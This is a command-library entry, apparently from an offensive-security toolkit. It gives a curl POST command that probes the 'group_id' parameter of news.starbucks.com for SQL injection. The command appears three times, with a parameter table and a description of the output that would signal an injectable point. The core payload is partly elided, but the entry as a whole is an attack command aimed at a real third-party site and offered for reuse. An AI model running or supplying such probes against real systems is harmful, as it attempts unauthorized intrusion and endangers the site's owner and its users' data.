---
id: cmd-uuid-001
data: >-
  curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(... ) AND
  group_id='1" https://news.starbucks.com
tags:
  - sql-injection
  - probe
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.255Z'
verified: false
validated: true
submitted: true
---
# identify-group-id-vuln

## Command

```bash
curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(... ) AND group_id='1" https://news.starbucks.com
```

## Description

Sends a POST request to probe the 'group_id' parameter for SQL injection vulnerability using a partial IF payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data` | POST body with parameters and payload | Yes |
| `ACT=55` | Action identifier | Yes |
| `jsontree={\"x\":1}` | JSON parameter | Yes |
| `site_id=1` | Site identifier | Yes |
| `group_id=...` | Injected payload | Yes |
| `https://news.starbucks.com` | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(... ) AND group_id='1" https://news.starbucks.com
```

### Advanced Usage

Add verbose output: ```bash
curl -v --data "..." https://news.starbucks.com
```

## Expected Output

HTTP response from the server, typically JSON or HTML without SQL errors, indicating potential injection point.

## Related

- [[commands/test-true-condition-sqli]]
